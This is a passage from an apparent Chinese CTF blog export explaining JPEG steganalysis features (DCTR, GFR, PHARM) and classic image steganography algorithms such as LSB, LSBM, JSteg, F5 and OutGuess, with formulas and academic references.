8$的矩阵为$\\mathrm{U}^{(\\mathrm{i}, \\mathrm{j})}=\\mathrm{X} \\star \\mathrm{B}^{(\\mathrm{i}, \\mathrm{j})}$，这些矩阵的四个顶点为：\n$$\n\\begin{equation}\n\\mathcal{G}_{8 \\times 8}=\\{0,7,15, \\ldots, \\mathrm{M}-9\\} \\times\\{0,7,15, \\ldots, \\mathrm{N}-9\\}\n\\end{equation}\n\\tag{2}\n$$\n\n$(m, n) \\in \\mathcal{G}_{8\\times 8}$是对应的JPEG图像上的一个修改的系数，这个系数存在于$(k,l)$矩阵中。$(m,n)$位置上DCT系数的变化将影响一整块$8 × 8$矩阵中的所有像素，以及在$\\mathbf{U}^{(\\mathbf{i}, \\mathbf{j})}$中以$(m, n) \\in \\mathcal{G}_{8 \\times 8}$这个点为中心的整个15 × 15的领域。特别地，这些值的修改有下面的“单元响应” $\\mathbf{R}^{(\\mathbf{i}, \\mathbf{j})(\\mathbf{k}, \\mathbf{l})}$来完成：\n$$\n\\mathrm{R}^{(\\mathrm{i}, \\mathrm{j})(\\mathrm{k}, 1)}=\\mathrm{B}^{(\\mathrm{i}, \\mathrm{j})} \\otimes \\mathrm{B}^{(\\mathrm{k}, 1)}\n\\tag{3}\n$$\n由公式$(3)$假设我们已知某个二次采样后的$8 × 8$矩阵的四个顶点分别定义为：A、B、C、D，对于一个特定的值$u \\in \\mathrm{U}^{(\\mathrm{i}, \\mathrm{j})}$，即$u$为$8 × 8$矩阵中的其中一个元素，它的位置为$(a,b)$，$a, b \\in [0,7]$. 我们以8x8左上角的顶点为参照点，则其他B-D的点分别为：$(a,b-8), (a-8,b), (a-8,b-8)$，这个8x8的矩阵为构成为量化DCT系数的$\\mathcal{A}$块。并设定$\\mathcal{A}$块右、下、右下的8x8块分别为$\\mathcal{A}, \\mathcal{B}, \\mathcal{C}, \\mathcal{D}$区域，则分别有四个矩阵：$A_{k l}, B_{k 1}, C_{k l}, D_{k l}$，$(k,l)$分别表示横向和纵向的空域坐标轴的位置，由上所述可得：\n$$\nu=\\sum_{k=0}^{7} \\sum_{l=0}^{7} Q_{k l}\\left[A_{k l} R_{a, b}^{(i, j)(k, l)}+B_{k l} R_{a, b-8}^{(i, j)(k, l)}+C_{k l} R_{a-8, b}^{(i, j)(k, l)}+D_{k l} R_{a-8, b-8}^{(i, j)(k, l)}\\right]\n\\tag{4}\n$$\n由公式$(4)$我们可知$u$在$(a,b)$的变化，不见影响$\\mathcal{A}$区域的$8 × 8$矩阵每个像素点$(i,j)$，还会影响其他三个相邻区域的$\\mathrm{B}_{\\mathrm{k} 1}, \\mathrm{C}_{\\mathrm{k} 1}, \\mathrm{D}_{\\mathrm{kl}}$三个8x8矩阵的DCT系数。由此我们可以通过两个坐标准确定位一个像素点：$(k,l)$确定了$8 × 8$矩阵的位置，$(a,b)$确定了$8 × 8$矩阵里元素的相对位置，因此我们可以准确定义一个二维矩阵$\\mathrm{U}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{k}, 1)} \\in R^{(M-8) / 8 \\times(N-8) / 8}$作为$\\mathrm{U}^{(\\mathrm{k}, 1)}$的子矩阵（$\\mathcal{G}_{8 \\times 8}$网格中以左上角顶点为参考对象，相对坐标为$a,b$）。由此，邻接矩阵的关系为：\n$$\n\\begin{split}\n\\mathrm{U}^{(\\mathrm{k}, 1)}=\\bigcup_{\\mathrm{a}, \\mathrm{b}=0}^{7} \\mathrm{U}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{k}, 1)} \\quad 当(a, b) \\neq\\left(a^{\\prime}, b^{\\prime}\\right)时,有\\mathrm{U}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{k}, 1)} \\cap \\mathrm{U}_{\\mathrm{a}^{\\prime}, \\mathrm{b}^{\\prime}}^{(\\mathrm{k}, 1)}\n\\end{split}\n\\tag{5}\n$$\n因此特征向量由$0 \\leq \\mathrm{k}, 1 \\leq 7,0 \\leq \\mathrm{a}, \\mathrm{b} \\leq 7$归一化的直方图构成：\n$$\n\\mathrm{h}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{k} 1 \\mathrm{l})}(\\mathrm{r})=\\frac{1}{\\left|\\mathrm{U}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{k}, 1)}\\right|} \\sum_{\\mathrm{u} \\in \\mathrm{U}_{\\mathrm{a}, \\mathrm{b}}^{(\\mathrm{kl})}}\\left[\\mathrm{Q}_{\\mathrm{T}}(|\\mathrm{u}| / \\mathrm{q})=\\mathrm{r}\\right]\n\\tag{6}\n$$\n其中，$Q_{T}$质心为$\\{0,1, \\ldots, \\mathrm{T}\\}$的整数，实际上就是每个直方图的bins，$q$是量化步长，$\\left[\\mathrm{Q}_{\\mathrm{T}}(|\\mathrm{u}| / \\mathrm{q})=\\mathrm{r}\\right]$中的$[P]$是一个判决器，当等式成立时为1，否则为0。\n\n综上，DCTR算法的流程如图:\n<div style=\"text-align: center;\">\n\n![DCTR算法的流程](1559128502282.png)\n</div>\n-----------------\n\n## 0x20 自适应二维Gabor过滤器\n\nGFR全称Gabor Filter Residual[2]，这里我们把它称为二维Gabor残差过滤器。GFR能够从不同的尺度和方向准确地描述图像纹理和边缘特征，可以从丰富的图像中抽象出统计特征，以此来更有效地反映JPEG图像被嵌入秘密信息后的变化，提高数字图像隐写分析的性能。GFR利用不同尺度和方向的二维Gabor滤波器[3]对解压后的JPEG图像进行分解，然后从图像滤波系数中提取隐写分析特征。其中二维的Gabor过滤器作为本地带通滤波器在空间域和变换域具有一定的最优联合定位的特性，其能够有效地描述图像纹理和边缘特征。相比于利用64个DCT核对图像滤波的DCTR，二维Gabor过滤器可以捕获嵌入变化更多的尺度和方向，所以GFR可以更能利用自适应隐写的特性。\n\nGabor变换属于短时傅里叶变换（STFT），其在傅里叶变换中加入了高斯窗，实现了空间域和变换域的局部分析。当使用二维Gabor滤波器进行图像处理和分析时，首先对图像进行二维Gabor滤波器滤波，然后对其特征提取、边缘检测、去噪等处理或分析。首先，将输入的图像$I(\\mathrm{x},\\mathrm{y})$与二维Gabor函数$\\mathrm{g}(\\mathrm{x},\\mathrm{y})$卷积，得到一个Gabor特征图$\\mathrm{u}(\\mathrm{x}, \\mathrm{y})$：\n$$\n\\mathrm{u}(\\mathrm{x}, \\mathrm{y})=\\iint_{\\Omega} \\mathrm{I}(\\xi, \\eta) \\mathrm{g}(\\mathrm{x}-\\xi, \\mathrm{y}-\\eta) \\mathrm{d} \\xi \\mathrm{d}\n\\tag{7}\n$$\n其中，$(\\mathrm{x}, \\mathrm{y}) \\in \\Omega$，$\\Omega$表示图像像素点集。公式$(7)$中的$\\mathrm{g}(\\mathrm{x},\\mathrm{y})$函数采用文献[4]的Gabor函数族，它是高斯函数和余弦函数的乘积：\n$$\n\\mathrm{g}_{\\lambda, \\theta, \\phi}(\\mathrm{x}, \\mathrm{y})=\\mathrm{e}^{-\\left(\\left(\\mathrm{x}^{\\prime} 2+\\gamma^{2} \\mathrm{y}^{\\prime} 2\\right) / 2 \\sigma^{2}\\right)} \\cos \\left(2 \\pi \\frac{\\mathrm{x}}{\\lambda}+\\phi\\right)\n\\tag{8}\n$$\n其中，$\\mathrm{x}^{\\prime}=\\mathrm{x} \\cos \\theta+\\mathrm{y} \\sin \\theta, \\mathrm{y}^{\\prime}=-\\mathrm{x} \\sin \\theta+\\mathrm{y} \\cos \\theta, \\sigma=0.56 \\lambda, \\gamma=0.5$。σ越小，表示空间分辨率越高，图像滤波系数反应的局部属性在小尺度；反之，意味着空间分辨率越低，反映再图像的大尺度。最后，所以Gabor滤波器均中心化，其所有元素减去核均值，行成高通滤波器。\n\n提取特征时，GFR隐写分析算法的步骤如下：\n\n- 步骤一：将JPEG图像解压缩到空间域，且不将像素值量化为   ，以避免信息丢失。\n- 步骤二：将通过公式$(7)$生成不同尺度和方向的二维Gabor滤波组   ，其过程类似于DCTR过程中的公式$(3)$。\n- 步骤三：将步骤一生成的解压后的JPEG图像与步骤二生成的每个8x8二维Gabor滤波器卷积，滤波后的图像为$\\mathbf{U}_{\\mathbf{a}, \\mathbf{b}}^{\\boldsymbol{s}, \\mathbf{l}}$，有：\n\n> 1. 根据64个8x8的DCT块，对滤波后的图像$\\mathbf{U}^{\\mathbf{S}, \\mathbf{I}}$按步长为8进行子采样，得到64个子图像$\\mathbf{U}_{\\mathbf{a}, \\mathbf{b}}^{\\boldsymbol{s}, \\mathbf{l}}$；\n>\n> 2. 对于每个子图像$\\mathbf{U}_{\\mathbf{a}, \\mathbf{b}}^{\\boldsymbol{s}, \\mathbf{l}}$，其直方图特征$\\mathbf{h}_{\\mathbf{a}, \\mathbf{b}}^{\\mathbf{s . 1}}(x)$如公式$(9)$：\n> $$\n> \\mathbf{h}_{\\mathbf{a}, \\mathbf{b}}^{s .1}(x)=\\frac{1}{\\left|\\mathbf{U}_{\\mathbf{a}, \\mathbf{b}}^{s .1}\\right|} \\sum_{u \\in \\mathbf{U}_{\\mathbf{a}, b}^{s .1}}\\left[Q_{T}(|u| / q)=x\\right]\n> \\tag{9}\n> $$\n>\n> ​\t\t式中各项变量的说明，如公式$(6)$所说。\n>\n> 3. 根据文献[4]的方法，这里将64个子图像$\\mathbf{U}_{\\mathbf{a}, \\mathbf{b}}^{\\boldsymbol{s}, \\mathbf{l}}$的直方图特征全部合并，得到滤波后图像$\\mathbf{U}^{\\mathbf{S}, \\mathbf{I}}$的直方图特征$\\mathrm{h}^{\\mathrm{S}, 1}$。\n\n- 步骤四：对具有相同参数σ的二维Gabor过滤器过滤后生成的图像，其相应的直方图特征进行对称合并，这一点也与DCTR相似。例如，假设方向参数$\\theta=\\{0, \\pi / 8,2 \\pi / 8, \\cdots, 6 \\pi / 8,7 \\pi / 8\\}$，生成的滤波图像的直方图特征$\\theta=\\pi / 8,7 \\pi / 8$和$\\theta=2 \\pi / 8,6 \\pi / 8$两两合并。\n\n综上，GFR的过程与DCTR过程最大区别在于选取的64个卷积核不一样，GFR更能代表图像的整体纹理特征，其步骤如下图:\n<div style=\"text-align: center;\">\n![GFR算法流程](1559130220786.png)\n</div>\n--------\n\n## 0x30 相位感知投影模型\n\n​\t相位感知投影模型（PHARM）[5]使用基于小内核的像素预测器来避免混合具有不同系谱的随机变量，该方法没有是用大量的像素预测器来实现特征的多样化，而是使用了少量的Small-Support线性像素预测器，并采用了与投影空间富模型（PSRM）类似的方式来实现模型的多样化。下面会粗略介绍一下SRM[6]和PSRM[7]来引出PHARM。\n\n​\t假定两个符号$\\mathrm{X}, \\mathrm{Y} \\in\\{0, \\ldots, 255\\}^{\\mathrm{n}_{1} \\times \\mathrm{n}_{2}}$，分别表示$n_{1} \\times n_{2}$维的灰度Cover图像和灰度Stego载体图像中的二维像素值数组，$n_1,n_2$均为8的倍数。无论是SRM还是PSRM都是从45个不同的像素预测器估计给定图像的噪声成分开始的。像素预测器分两种类型：线性和非线性。每个线性预测器都是一个由核矩阵$K$描述的移不变有限脉冲响应线性滤波器。通过将预测图像从原始图像中减去，得到噪声残差$\\mathrm{Z}=\\left(\\mathrm{z}_{\\mathrm{k} \\mathrm{l}}\\right)$，（$\\mathrm{k},\\mathrm{l}$在接下来的公式中表示一个$n_{1} \\times n_{2}$矩阵的索引）它是一个与$X$的维数相同的矩阵:\n$$\n\\mathrm{Z}=\\mathrm{K} * \\mathrm{X}-\\mathrm{X}\n\\tag{10}\n$$\n\t由此，我们得到了基本的噪声残差$Z$，其中“$*$”表示$K$和$X$ 镜面填充卷积，使得这两个矩阵卷积后的维数保持不变。 举一个最简单的线性残差的例子：$\n\\mathrm{z}_{\\mathrm{kl}}=\\mathrm{x}_{\\mathrm{k}, \\mathrm{l}+1}-\\mathrm{x}_{\\mathrm{k}, \\mathrm{l}}\n$表示邻接横向残差，其预测器$K = (0 \\  1)$，则表示将像素值估算为水平相邻的像素值。\n\n​\tSRM中的非线性预测器通过取两个或两个以上的残差的最小值或最大值来得到的。例如，分别对$X_{i,j}$像素在水平和垂直方向上预测，得到水平和垂直方向上的残差$\\mathbf{Z}^{h}=\\left(\\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{h})}\\right), \\mathbf{Z}^{(v)}=\\left(\\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{v})}\\right)$:\n$$\n\\begin{aligned} \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{h})} &=\\mathrm{x}_{\\mathrm{k}, \\mathrm{l}+1}-\\mathrm{x}_{\\mathrm{kl}} \\\\ \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{v})} &=\\mathrm{x}_{\\mathrm{k}+1,\\mathrm{l}}-\\mathrm{x}_{\\mathrm{kl}} \\end{aligned}\n\\tag{11}\n$$\n则非线性的最值残差如下：\n$$\n\\begin{aligned} \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{min})} &=\\min \\left\\{\\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{h})}, \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{v})}\\right\\} \\\\ \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{max})} &=\\max \\left\\{\\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{h})}, \\mathrm{z}_{\\mathrm{kl}}^{(\\mathrm{v})}\\right\\} \\end{aligned}\n\\tag{12}\n$$\n\t与SRM通过四个方向来捕获残差的统计特性不同的是，PSRMQ3是用残差投影到多个随机方向的一阶统计量。给定噪声残差$Z$，这里直接列出量化值的直方图函数[3]：\n$$\n\\begin{aligned}\n\\mathrm{h}_{\\mathrm{j}}^{(\\mathrm{i})}&=\\left|\\left\\{(\\mathrm{k}, 1)| | \\mathrm{p}_{\\mathrm{kl}}^{(\\mathrm{i})} |=\\mathrm{j}+1 / 2\\right\\}\\right|, \\mathrm{j} \\in\\{0,1, \\ldots, \\mathrm{T}-1\\}, \\mathrm{i} \\in\\{1, \\ldots, v\\}, 线性极差\\\\\n\\mathrm{h}_{\\mathrm{j}}^{(\\mathrm{i})}&=\\left|\\left\\{(\\mathrm{k}, 1) | \\mathrm{p}_{\\mathrm{kl}}^{(\\mathrm{i})}=\\mathrm{j}+1 / 2\\right\\}\\right|, \\mathrm{j} \\in\\{-\\mathrm{T}, \\ldots, \\mathrm{T}-1\\}, \\mathrm{i} \\in\\{1, \\ldots, \\mathrm{v}\\}, 非线性极差\n\\end{aligned}\n\\tag{13}\n$$\n\t其中，$\\mathrm{p}_{\\mathrm{kl}}^{(\\mathrm{i})} \\leftarrow \\mathrm{Q}_{\\mathrm{T}}\\left(\\mathrm{p}_{\\mathrm{kl}}^{(\\mathrm{i})} / \\mathrm{q}\\right)$，而$p_{k l}^{(i)}=\\mathrm{P}^{(\\mathrm{i})} \\triangleq \\mathrm{Z} * \\Pi^{(\\mathrm{i})}$，$\\boldsymbol{\\Pi}^{(\\mathrm{i})}$是随机矩阵：$\\Pi^{(\\mathrm{i})} \\in \\mathrm{R}^{\\mathrm{r\\times s}}, \\mathrm{i} \\in\\{1, \\ldots, v\\}$ 。\n\n​\t在PHARM中，仅使用线性（“spam”类）残差和以下7个内核：\n$$\n\\left(\\begin{matrix}-1&1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}-1\\\\1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}1&-3&3&-1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}1\\\\-3\\\\3\\\\-1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}1&1\\\\-1&-1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}-1&1\\\\-1&1\\\\\\end{matrix}\\right)\\ \\ \\ \\left(\\begin{matrix}1&-1\\\\-1&1\\\\\\end{matrix}\\right)\n$$\n​\t这些核使用贪心正向特征选择算法获得最佳互补核，该算法使用下面列出的25个预测核的检测误差的OOB（Out-of-bag）估计，其中下面列出的第一、第二和第三阶内核使用的预测器与面向相应方向的SRM中使用的预测器相同：\n\n- 1 x 2一阶的水平、垂直、主次对角线（4个预测核）；\n- 1 x 3二阶的水平、垂直、主次对角线（4个预测核）；\n- 1 x 4三阶的水平、垂直、主次对角线（4个预测核）；\n- 2 x 2水平   、垂直   、对角线   （主次对角线相同）（3个预测核）；\n- 3 x 3核和它的4个EDGE（2 x 3）版本的核，如SRM（5个预测核）；\n- 5 x 5在SRM中用在SQUARE子模型的核，以及它的4个EDGE（3x5）版本的核（5个预测核）\n\n​\t上面6种类型的预测核不需要都使用，在后续提取JPEG图像的PHARM特征时，使用了一阶、二阶和$2 \\times 2$核。\n\n\n\n--------\n\n## 0x40 总结\n\n本章详细介绍了DCTR、GFR、PHARM三种隐写分析算法的原理和具体步骤.\n\n\n\n-----------\n\n## 0x50 参考文献\n\n> [1] Holub V ,  Fridrich J . Low-Complexity Features for JPEG Steganalysis Using Undecimated DCT[J]. IEEE Transactions on Information Forensics and Security, 2015, 10(2):219-228.\n>\n> [2] Song X ,  Liu F ,  Yang C , et al. Steganalysis of Adaptive JPEG Steganography Using 2D Gabor Filters[C]// the 3rd ACM Workshop. ACM, 2015\n>\n> [3] augman J G . Uncertainty relation for resolution in space, spatial frequency, and orientation optimized by two-dimensional visual cortical filters[J]. Journal of the Optical Society of America. A, Optics and image science, 1985, 2(7):1160-1169.\n>\n> [4] Grigorescu S E , Petkov N , Kruizinga P . Comparison of texture features based on Gabor filters.[J]. IEEE Transactions on Image Processing A Publication of the IEEE Signal Processing Society, 2002, 11(10):1160-7.\n>\n> [5] Alattar A M ,  Memon N D ,  Heitzenrater C D , et al. SPIE Proceedings [SPIE IS&T/SPIE Electronic Imaging - San Francisco, California, United States (Sunday 8 February 2015)] Media Watermarking, Security, and Forensics 2015 - Phase-aware projection model for steganalysis of JPEG images[J]. Proceedings of SPIE - The International Society for Optical Engineering, 2015, 9409:94090T.\n>\n> [6] Fridrich J , Kodovsky J . Rich Models for Steganalysis of Digital Images[J]. IEEE Transactions on Information Forensics and Security, 2012, 7(3):868---882.\n>\n> [7] Fridrich J . Statistically undetectable jpeg steganography:dead ends challenges, and opportunities[C]// Workshop on Multimedia & Security. DBLP, 2007.\n\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"隐写术(二)--传统数字图像隐写算法","date":"2019-05-29T04:05:00.000Z","path":"2019/05/29/隐写术(二)--传统数字图像隐写算法/","raw":"---\ntitle: 隐写术(二)--传统数字图像隐写算法\ndate: 2019-05-29 12:05:00\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n---\n\n> 数字图像隐写算法根据不同的标准而有不同的分类。下面重要根据隐写算法的工作域和隐写算法的适用范围来展开数字图像隐写算法的介绍。<!-- more -->\n\n---------------\n## 0x10 基于空间域的隐写算法\n\n### 0x11 基于LSB方法的隐写算法\nLSB（Least Significant Bit），最低有效位，该算法的基本原理是将载体图像的LSB篡改为信息者想要发送的秘密信息的二进制位。LSB隐写算法是一种简单且高效的信息隐藏技术。对于PNG或者BMP图像，一般是由RGB三原色（红绿蓝）组成，每种颜色占用8bit即一个字节的空间，每个像素的像素值范围为 `0x00~0xFF`，对于彩色图来说，总共有 $256^3$种颜色。所以如果用LSB方法隐藏信息，每个像素可以隐藏3Bit的信息。LSB隐写通过修改RGB颜色分量的最低二进制位（LSB），即使图像像素当中最不重要的那一位发生改变也无法使肉眼察觉出来。一般的载体位平面图像如图：\n<div style=\"text-align: center;\">\n\n![LSB原理示意图](8343187-2cd3356926d9d9e8.png)\n</div>\nLSB平面的最低位在一个像素中如图：\n<div style=\"text-align: center;\">\n\n![LSB和位平面](8343187-59e0417e3e8c6517.png)\n</div>\n\n上面右边的0即为LSB，每个像素的LSB组成LSB面，我们可以在这个面嵌入信息而难以引起隐写分析的注意。下图是关于水果BMP照片的各个位平面之间的对比图：\n<div style=\"text-align: center;\">\n\n![灰度图像8个位平面的二值图](8343187-3910e7c974727711.png)\n</div>\n假设我们需要嵌入3bit的秘密消息，则如下图：\n<div style=\"text-align: center;\">\n\n![秘密信息替换载体图像的LSB成为载密图像](8343187-1195edebf489b7f7.png)\n</div>\n对于嵌入过程可分为三个步骤：\n\n- 步骤一：在Cover中由给定的密钥（Key）来挑选嵌入的像素数量 Length(message)；\n- 步骤二：对于经过步骤一确定的像素数量和给定的二进制格式的秘密信息，比较这些点的最不重要位（LSB）是否与待嵌入的二进制格式的秘密信息相同，如果相同，则不更改最不重要位（LSB）；否则，执行步骤三；\n- 步骤三：用二进制格式的秘密信息替换掉选定像素点的最不重要位（LSB），而该像素点除了LSB的其他二进制位保持不变，则修改成为Stego。\n\n对于提取过程，根据密钥（Key）找到Stego中嵌入密码信息的像素位置，随后抽出这些像素灰度值的LSB，排列后组成秘密信息，最后将这些二进制信息转成ASCII码或Uni11code码等其他编码格式的文本或者其他多媒体格式。\n\n在上述嵌入秘密信息的步骤三中，有一个重要环节是选择嵌入秘密信息的像素位置，通常有两种方法可以实现——随机间隔和连续嵌入法，如下两图所示：\n<div style=\"text-align: center;\">\n\n![连续嵌入法](8343187-50504f197a39e8f0.png)\n</div>\n<div style=\"text-align: center;\">\n\n![随机间隔法 ](8343187-c9d41c4241fd9b27.png)\n</div>\n LSB是较为早期的隐写算法，该方法原理简单、嵌入容量大、嵌入成本低，但是会导致灰度值在`2i`和`2i+1`的像素趋于一致，因此出现了“值对”效应。基于这种易于被统计的现象，隐写分析者设计出差分直方图检测法[1]、RS检测法[2]、$x^2$检测法[3]。\n\n### 0x12 LSBM隐写算法\n\n“值对”现象的出现，极大地降低了隐写系统的安全性，数字图像隐写的研究者们竭力在寻找能够修改甚至替代LSB的算法，只为消除其“值对”现象。LSBM算法便是在此背景下被Toby Sharp提出。该算法只是在LSB的基础上做了细微的“优化”来避免“值对”现象，在嵌入秘密信息的时候，如果载体图像被选定的、待嵌入的像素点的LSB与二进制形式的秘密信息不同，则对该LSB任意地`+1`或者`-1`（必须保证其随机性，以防止攻击者的“值对”分析）。此外，研究者还将加减复读进行了扩展，假设欲加减的正整数为 `K`，在这里`K`有两种情况，一种是当$K\\in奇数$的时候，使待嵌入的秘密信息二进制形式对应的比特位与数字图像待嵌入点的像素值的LSB保持一致。另一种则是当$K\\in偶数$时，数字图像待嵌入点的像素值LSB的前一位和秘密信息保持一致。这种方法有效地避免了在2i和2i+1之间的值对现象，能够绕过$x^2$检测方法和RS检测方法。基于LSBM隐写算法还出现了其他改进算法提高嵌入效率、增强隐写算法的安全性如：LSBMR（LSBM Revisited）[4]算法和G-LSBM（Generalization of LSBM）[5]算法等。此外，还出现了最低多位替换算法MLSB（Multi LSB）算法。及其改进算法IMLSB（Independent MLSB）和TMLSB（Truss MLSB）。IMLSB算法根据密钥选取图像的最低多个平面上的比特位，并将其替换为秘密信息。该方法对各个位平面的影响是独立的，因此简称为IMLSB替换隐写；TMLSB算法根据密钥选取图像像素，然后将所选像素的最低多位看做一个整体，替换为秘密信息，因此简称为TMLSB替换隐写。\n\n### 0x13 随机调制隐写算法\n\n随机调制隐写算法[6]基本思想是将欲嵌入信息调制成具有特定概率分布的噪声，并用调制后的信号替代图像获取设备带来的噪声（如高斯白噪声），使攻击者无法区分这些噪声是由图像获取设备产生的还是由隐写所引起的。首先，定义奇偶函数（Parity Function）：\n<center>\n\n![公式1](公式1.png)\n</center>\n其中$x∈{0≤i≤255}$, i是整数, s取所有整数，且s不等于0，则对某个固定的s，可以任意定义$f(x, s)$的前2s个值，然后推知2s+1以后的所有函数值。\n\n早期的噪声随机调制算法有Marvel等人提出来的SSIS（Spread Spectrum Image Steganography）[7]算法。该算法将秘密信息经过调制后跟载体图像叠加以实现信息隐藏；提取时，需要根据载密图像的数据推测载体图像，将载密图像和载体图像的差值（也就是噪声值）通过解调解析出秘密信息。此外，该方法还引入了纠错码技术，以提高秘密信息的准确率。\n\n### 0x14 有限调色板图像隐写术\n\n图像处理中为了节省表示图像RGB信息的空间用调色板存储彩色信息（RGB值），数据区只存储当前像素的色彩在调色板中的位置，这样就省了很多字节。不过真彩色的图像没有调色板。利用调色板数据进行隐藏，其基本思想是用秘密信息比特替换调色板的颜色向量的LSB。在实际图像数据中进行LSB的替换。此类隐写首先需要对调色板进行排序，排序后调色板中相邻颜色在感官上是接近的。用调色板的排序方式对信息进行编码。因为有N!种不同的方式对调色板进行排序，所以可以用来对一个短信息进行编码。保持调色板的颜色不变，数目扩大一倍，因此图像中的每一个颜色值对应两个调色板索引，根据秘密信息比特，选择两个相同颜色中的一个。基于调色板的信息隐藏，其鲁棒性都较差，攻击者只要对调色板重新排序、或者对图像的格式进行变换，就很有可能破坏秘密信息。\n\n## 0x20 基于变换域的隐写算法\n\nLSB及其变形是空域算法，虽然嵌入、提取容易，但是鲁棒性差、安全性低，易于造成隐藏信息的损失或被攻击者发现隐藏信息。随着互联网技术不断发展，JPEG[8]（Joint Photographic Experts Group，联合图像专家小组）图像由于其优秀的压缩能力也在网络中大量传输，而JPEG图像编码算法公开获得了很多隐写研究者的青睐。由此，数字图像隐写研究者考虑从变换域中嵌入信息。由于JPEG图像格式采用的是有损压缩技术，通过不同的质量因子，图像显示的效果会有所不同，因而使得攻击者难以辨别图像中的异常是嵌入的隐藏信息还是因为有损压缩导致的噪点。对于JPEG图像的生成过程，如图所示：\n<div style=\"text-align: center;\">\n\n![ JPEG压缩算法流程图](8343187-32a945f431350912.png)\n</div>\n\n\n其中最重要的有四个步骤：夜色模式转换/采样、DCT、量化、编码。DCT（Discrete Cosine Transform，离散余弦变换）是码率压缩中常用的一种变换编码方法。DCT过程是隐写研究者着重研究的内容，在DCT变换的系数上隐写是常见的隐写方法，也是众多隐写方法的着手点。\n\n### 0x21 JSteg隐写算法\n\nJSteg是最早用于JPEG隐写的隐写算法，其核心思想就是将空域的LSB隐写应用到JPEG图像的DCT变换过程中。具体来说，就是将二进制的隐藏信息嵌入到DCT系数的LSB上，如果隐藏信息的二进制数与DCT的LSB相对应的二进制数相同则不替换，否则替换成隐藏信息的二进制数。如图所示。\n<div style=\"text-align: center;\">\n\n![JPEG的DCT系数LSB替换](8343187-dcd875e2fb0d97d1.png)\n</div>\n\nJSteg隐写算法整体流程如下图：\n<div style=\"text-align: center;\">\n\n![JSteg隐写算法的流程](8343187-3c316505cfd6906d.png)\n</div>\n\n虽然JSteg算法简单、高效，但是同样或出现“值对”效应，很容易被直方图统计攻击，因此在卡方攻击面前无所遁形。JPEG图像由于其算法特性具有两个标志性统计特征分别是：分块效应和直方图特性，因此大部分隐写分析算法利用这两个统计特性进行攻击。通用的JSteg检测方法有：基于小波特征函数统计矩阵的隐写分析方法、基于支持向量机的多特征盲检测算法等。基于小波特征函数统计矩阵的隐写分析方法将小波子带特征函数的统计矩阵作为隐写分析的特征；基于支持向量机的多特征盲检测算法则利用分块效应，将载密图像解压到空域后，裁剪图像然后冲压缩得到校准图像，最后得出特征函数。\n\n### 0x22 F5隐写算法\n在F5隐写算法[9]出现之前，还出现过其前身F3、F4[9]隐写算法。F3隐写算法解决了JSteg隐写算法的DCT系数直方图的“值对”现象。与LSBM隐写算法类似，F3算法在非零DCT系数上的LSB嵌入信息，如果秘密信息的比特位与对应DCT系数的LSB比特位的值相同，则不变，否则对该DCT系数的LSB`±1`。F3算法成功抵抗了卡方攻击和RS攻击，提高了变换域隐写的安全性，但是该算法仍能通过直方图统计的方法找到其特征，因此无法有效避免统计攻击。由此研究者提出了F4隐写算法，优化了嵌入秘密信息后的DCT系数奇偶正负的特性，使得嵌入信息后的DCT系数一阶统计特性保持不变。而F5隐写算法的统计系数直方图会向中间靠拢，由此无法抵抗直方图攻击，由此Fridrich提出了nsF5隐写算法[10]（no-shrinkage F5），该算法利用湿纸编码算法消除了直方图收缩效应，该算法时JSteg系列算法中较为安全的算法，可以被用来测试盲检测算法的性能。\n\n### 0x23 OutGuess隐写算法\n\nOutGuess隐写算法[11]是由Niels Provos提出的为了解决JP Hide&Seek隐写算法缺陷的方法。该算法主要有两个步骤：1）嵌入过程：不修改值为0,1的DCT系数，通过伪随机数生成器生成下一步嵌入的位置（即，跳转的间隔）；2）纠正过程：利用未被修改的DCT系数来保证DCT系数的统计直方图保持跟嵌入秘密信息前的直方图相似，以消除值对现象。所以该方法既保持了DCT系数一阶统计特性，也保持了直方图的统计特性。后面Sallee又提出基于模型的隐写方法（Model Based）MB1隐写算法[12]及其改进算法MB2隐写算法[13]。MB1算法利用DCT系数出现的概率通过Cauchy分布对其进行拟合、算术重编码，以保持直方图统计特性；MB2算法在MB1的基础上对非零系数的隐写作了进一步限制——只能嵌入少于一半非零系数的秘密二进制信息，此外还对没有嵌入秘密信息的DCT非零系数做了微调，提高了统计特性的稳定性，增强了隐写算法的安全性。\n\n## 0x30 